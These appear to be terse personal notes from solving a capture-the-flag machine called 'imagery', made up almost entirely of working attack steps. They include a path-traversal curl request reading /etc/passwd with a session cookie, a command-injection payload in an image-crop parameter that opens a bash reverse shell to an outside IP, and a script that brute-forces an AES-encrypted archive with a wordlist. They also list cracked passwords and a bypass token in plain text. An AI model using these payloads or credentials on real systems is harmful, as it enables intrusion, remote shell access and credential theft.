eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aTDnaA.z7dGsWDtoxQKihGVmQ7ruT0Qeh0

curl -X GET "http://10.129.2.213:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd" \
  -H "Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aTDp_Q.zovs3Q2Lg_6o_jM_hFj3h9XcQz0

usertest@imagery.htb: iambatman

curl -X POST http://10.129.2.213:8000/apply_visual_transform \
  -H "Content-Type: application/json" \
  -H "Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aTDtjg.G0r7eR_V3ynnRdXMXUcdR_H4rkg" \
  -d '{
    "imageId":"b23b4145-519c-48e2-b181-aec7293c4171_image",
    "transformType":"crop",
    "params":{
      "x":";setsid /bin/bash -c \" /bin/bash -i >& /dev/tcp/10.10.15.27/4444 0>&1\";",
      "y":0,
      "width":1,
      "height":1
    }
  }'

cron bypass token K7Zg9vB$24NmW!q8xR0p/runL!





to crack the found aes file
```python
#!/usr/bin/env python3
import pyAesCrypt

wordlist = open('/usr/share/wordlists/rockyou.txt', 'rb')
infile = 'web_20250806_120723.zip.aes'
buffer = 64 * 1024

for line in wordlist:
    password = line.strip().decode('utf-8', errors='ignore')
    try:
        pyAesCrypt.decryptFile(infile, 'output.zip', password, buffer)
        print(f"[+] Password found: {password}")
        break
    except ValueError:
        continue
```

password: bestfriends

mark: supersmash
to be able to do su mark first upgrade the shell with pty spawn command
